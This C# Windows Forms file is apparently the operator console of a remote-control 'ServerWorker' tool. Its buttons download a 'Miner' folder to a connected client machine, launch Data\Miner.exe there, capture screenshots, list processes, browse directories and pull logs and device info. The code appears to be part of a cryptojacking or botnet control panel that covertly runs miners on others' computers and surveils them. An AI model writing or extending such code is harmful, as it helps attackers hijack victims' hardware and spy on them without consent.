using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using ServerWorker.Server;
using Interfaces;
using System.Reflection;

namespace ServerWorker
{
    public partial class FormUserCard : Form
    {

        private User user;
        private LogUserCard log;
        private PictureForm picture;
        private UserCard.UserData userData;

        public FormUserCard(User user)
        {
            InitializeComponent();
            this.user = user;
            userData = new UserCard.UserData();
            try
            {
                userData.id = user.UsersCom.GetKey();
                Log.Send("UserKey: " + userData.id);
            }
            catch(Exception ex)
            {
                Log.Send("FormUserCard: " + ex.Message);
            }
            LoadUserCard();
        }

        private void button1_Click(object sender, EventArgs e)
        {            
            log = new LogUserCard();
            log.Show();
            log.Text = "Ожидайте, идет получение лога..";
            DrawLog(user.UsersCom.GetLog());
        }

        private void DrawLog(List<string> events)
        {
            try
            {
                if (log.InvokeRequired) Program.form1.BeginInvoke(new Action(() => { log.DrawNewLog(events); }));
                else log.DrawNewLog(events);
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            DrawInfoDevice(user.UsersCom.GetInfoDevice());
        }

        private void DrawInfoDevice(IInfoDevice infoDevice)
        {
            if (listBox2.InvokeRequired) listBox2.BeginInvoke(new Action(() => { listBox2.Items.Clear(); }));
            else listBox2.Items.Clear();
            userData.infoDevice = infoDevice;

            foreach (string str in infoDevice.GetListInfo())
            {
                try
                {
                    if (listBox2.InvokeRequired) listBox2.BeginInvoke(new Action(() => { listBox2.Items.Add(str); }));
                    else listBox2.Items.Add(str);
                }
                catch
                { }
            }
        }


        private void LoadUserCard()
        {
            try
            {
                string[] dirs = Directory.GetFiles(UserCard.UserData.parthUserCard, "*.xml");
                foreach (string file in dirs)
                {
                    if (file == UserCard.UserData.parthUserCard + @"\"+ userData.id + ".xml")
                    {
                        userData = userData.RearDataFromFile(file);
                        break;
                    }
                }

                foreach (string str in userData.infoDevice.GetListInfo())
                {
                    try
                    {
                        if (listBox2.InvokeRequired) listBox2.BeginInvoke(new Action(() => { listBox2.Items.Add(str); }));
                        else listBox2.Items.Add(str);
                    }
                    catch
                    { }
                }


            }
            catch (Exception e)
            {
                Log.Send("The process failed: " + e.ToString());
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            user.UsersCom.DownloadFloader("Miner", "Data");
        }

        //private void button4_Click(object sender, EventArgs e)
        //{
        //    messenger.Update();
        //}

        //private void button5_Click(object sender, EventArgs e)
        //{
        //    string message = "RunProgram" + "_" + @"Data\Miner.exe";
        //    messenger.SendMessage(message);
        //}

        private void button4_Click_1(object sender, EventArgs e)
        {
            user.UsersCom.RunProgram(@"Data\Miner.exe");
        }

        private void button5_Click(object sender, EventArgs e)
        {
            user.UsersCom.DownloadUpdate();
        }

        private void button6_Click(object sender, EventArgs e)
        {
            if (userData.id != "")
                userData.SaveDataToFile(userData.id + ".xml");
        }

        private void button7_Click(object sender, EventArgs e)
        {
            try
            {
                user.UsersCom.Reconnect();
            } catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void button8_Click(object sender, EventArgs e)
        {
            picture = new PictureForm(user.UsersCom.ScreenShot());
            picture.Show();
        }

        private void button9_Click(object sender, EventArgs e)
        {
            listBox2.Items.Clear();
            listBox2.Items.AddRange(user.UsersCom.GetListProc().ToArray());
        }

        private void button10_Click(object sender, EventArgs e)
        {
            DirectoryViewForm directoryViewForm = new DirectoryViewForm(user);
            directoryViewForm.Show();
        }
    }
}
